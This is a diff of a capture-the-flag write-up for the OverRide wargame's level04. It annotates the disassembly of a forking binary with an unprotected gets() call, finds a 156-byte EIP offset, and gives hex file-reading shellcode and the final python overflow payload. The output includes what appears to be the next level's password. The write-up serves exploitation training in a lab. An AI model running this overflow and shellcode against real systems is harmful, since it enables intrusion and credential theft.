@@ -1,23 +1,76 @@
-level04@OverRide:~$ objdump -R level04
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+aaaaaaaaaaaaaaa
+child is exiting...
 
-level04:     file format elf32-i386
+ 80486d6:	e8 75 fe ff ff       	call   8048550 <fork@plt> --> We can see there that we create a child process
 
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049ff0 R_386_GLOB_DAT    __gmon_start__
-0804a040 R_386_COPY        stdout
-0804a000 R_386_JUMP_SLOT   fflush
-0804a004 R_386_JUMP_SLOT   gets
-0804a008 R_386_JUMP_SLOT   getchar
-0804a00c R_386_JUMP_SLOT   signal
-0804a010 R_386_JUMP_SLOT   alarm
-0804a014 R_386_JUMP_SLOT   wait
-0804a018 R_386_JUMP_SLOT   puts
-0804a01c R_386_JUMP_SLOT   __gmon_start__
-0804a020 R_386_JUMP_SLOT   kill
-0804a024 R_386_JUMP_SLOT   __libc_start_main
-0804a028 R_386_JUMP_SLOT   prctl
-0804a02c R_386_JUMP_SLOT   fork
-0804a030 R_386_JUMP_SLOT   __isoc99_scanf
-0804a034 R_386_JUMP_SLOT   ptrace
+ 8048709:	83 bc 24 ac 00 00 00 	cmpl   $0x0,0xac(%esp) --> Here we separate the parent from the child process
+ 8048710:	00 
+ 8048711:	75 56                	jne    8048769 <main+0xa1> --> parent process jump way down
+ 8048713:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
+ 804871a:	00 
+ 804871b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 8048722:	e8 19 fe ff ff       	call   8048540 <prctl@plt>
+ 8048727:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
+ 804872e:	00 
+ 804872f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
+ 8048736:	00 
+ 8048737:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
+ 804873e:	00 
+ 804873f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048746:	e8 25 fe ff ff       	call   8048570 <ptrace@plt> --> Here (we are in the child process) we start a ptrace so we can't use exec without parent checking on us
+ 804874b:	c7 04 24 03 89 04 08 	movl   $0x8048903,(%esp)
+ 8048752:	e8 a9 fd ff ff       	call   8048500 <puts@plt>
+ 8048757:	8d 44 24 20          	lea    0x20(%esp),%eax
+ 804875b:	89 04 24             	mov    %eax,(%esp)
+ 804875e:	e8 4d fd ff ff       	call   80484b0 <gets@plt> --> Unprotected
+ 8048763:	e9 b2 00 00 00       	jmp    804881a <main+0x152> --> exit
+ 8048768:	90                   	nop
+ 8048769:	8d 44 24 1c          	lea    0x1c(%esp),%eax --> Parent destination
+ 804876d:	89 04 24             	mov    %eax,(%esp)
+ 8048770:	e8 7b fd ff ff       	call   80484f0 <wait@plt>
 
+Ok we can see that we have an unprotected gets in the child process, let's check eip offset
+
+We use : > (gdb) set follow-fork-mode child # to follow the child process instead of the parent
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04 
+[New process 1718]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1718]
+0x41326641 in ?? ()
+
+We have an offset of 156 !
+
+It's easy, we just have to put our shellcode in a env var, and send a padding of 156 + the address of our buffer and it should work ! 
+Buuuuuuut, the child is watched by ptrace so an exec in our shellcode will not worked and be stopped by the parent, we need to use an other thing
+We will use a shellcode that open, read, and then write our .pass file on the stdout !
+
+> export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
+
+# We need to find the adress of our shellcode :
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    printf("%p\n", getenv("SHELLCODE"));
+}
+
+level04@OverRide:/tmp$ gcc -m32 getenv.c 
+level04@OverRide:/tmp$ ./a.out 
+0xffffd7af --> Our address
+
+level04@OverRide:~$ python -c 'print("a" * 156 + "\xaf\xd7\xff\xff")' | ./level04 
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
+
+EZ
